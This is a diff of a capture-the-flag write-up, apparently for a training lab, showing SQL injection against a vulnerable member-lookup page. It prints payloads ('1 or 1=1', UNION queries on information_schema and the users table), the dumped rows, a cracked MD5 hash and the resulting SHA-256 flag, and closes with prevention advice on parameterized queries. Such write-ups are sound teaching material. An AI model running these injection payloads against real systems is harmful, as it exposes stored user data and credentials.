@@ -9,7 +9,7 @@ We got an sql syntax error:
 
 Then trying `1 or 1=1` will gives all members in the database:
 
-```
+```html
 ID: 1 or 1=1 
 First name: one
 Surname : me
@@ -35,11 +35,11 @@ As it seems from the last input the SQL request only retreive 2 columns so we wi
 
 Now let's look for all the databases names in the database using this sql injection.
 
-    `0 UNION select table_name,column_name from information_schema.columns`
+    0 UNION select table_name,column_name from information_schema.columns
 
 As you will see below we got the users database informations
 
-```
+```html
 ID: 0 UNION select table_name,column_name from information_schema.columns 
 First name: users
 Surname : user_id
@@ -77,11 +77,10 @@ Now we will try to see what all users has on the `Commnetaire` Column, It may be
 
     0 UNION select concat(first_name, last_name),concat(user_id,town,country,0,countersign,Commentaire) from users
 
-```
+```html
 ID:   0 UNION select concat(first_name, last_name),concat(user_id,town,country,0,countersign,Commentaire) from users 
 First name: FlagGetThe
 Surname : 5424205ff9d0165b4f92b14994e5c685cdce28Decrypt this password -> then lower all the char. Sh256 on it and it's good !
-
 ```
 As you can see the user Flag Has this string result `5ff9d0165b4f92b14994e5c685cdce28 Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
 
@@ -89,7 +88,8 @@ Now decripting it with md5: 5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo
 
 fortytwo (sha256): 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 
-# Prevent
+# Prevention
+
 To prevent SQL injection vulnerabilities, follow these measures:
 
 - Use prepared statements with parameterized queries to separate SQL code from user input.
